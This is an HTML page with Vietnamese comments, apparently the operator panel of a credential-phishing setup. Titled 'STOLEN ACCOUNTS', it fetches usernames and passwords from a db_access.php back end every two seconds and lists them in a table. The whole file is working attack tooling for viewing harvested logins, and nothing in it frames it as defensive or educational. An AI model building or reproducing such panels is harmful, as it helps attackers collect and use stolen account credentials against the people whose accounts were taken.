<!DOCTYPE html>
<html>
<head>
    <title>STOLEN ACCOUNTS</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h2>STOLEN ACCOUNTS</h2>
    <table border="1" cellpadding="5" id="dataTable">
        <thead>
            <tr>
                <th>No.</th>
                <th>Username</th>
                <th>Password</th>
            </tr>
        </thead>
        <tbody>
            <!-- du leu duoc chen tu dong vao day -->
        </tbody>
    </table>

    <script>
        function loadData() {
            $.get("db_access.php", function(data) {
                let rows = "";
                let json = JSON.parse(data);
                json.forEach((item, index) => {
                    rows += `
                        <tr>
                            <td>${index + 1}</td>
                            <td>${item.username}</td>
                            <td>${item.password}</td>
                        </tr>
                    `;
                });
                $("#dataTable tbody").html(rows);
            });
        }

        // tu dong load khi mo trang
        loadData();
        // 2 giay load lai 1 lan
        setInterval(loadData, 2000);
    </script>
</body>
</html>
